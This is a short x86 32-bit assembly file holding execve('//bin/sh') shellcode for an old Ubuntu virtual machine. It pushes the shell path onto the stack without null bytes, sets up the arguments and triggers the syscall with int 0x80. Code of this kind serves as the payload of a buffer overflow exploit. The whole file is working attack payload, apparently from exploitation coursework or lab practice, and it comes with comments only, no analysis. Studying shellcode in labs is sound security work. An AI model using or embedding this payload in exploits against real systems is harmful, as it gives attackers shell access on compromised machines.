; Shellcode for Ubuntu 4 (32 Bit) VM
; https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md#x86-32_bit

[SECTION .text]
global _start

_start:
    xor eax, eax            ; eax = 0x0

; Build stack:
	push eax                ; Null-Byte of string
	push 0x68732f6e
	push 0x69622f2f         ; '//bin/sh'
	mov ebx, esp            ; ebx = &'//bin/sh'
	push eax                ; Null-Byte of argv
	push ebx                ; Push pointer of '//bin/sh', argv[0]

; Occupy eax:
    mov al, 0x0b            ; 0x0b = execve
; Occupy edx:
	mov edx, esp
	xor ecx, ecx
	mov cl, 0x4
	add edx, ecx            ; edx = &'\0'
; Occupy ecx:
    mov ecx, esp            ; ecx = argv[0]

; Interrupt
    int 0x80
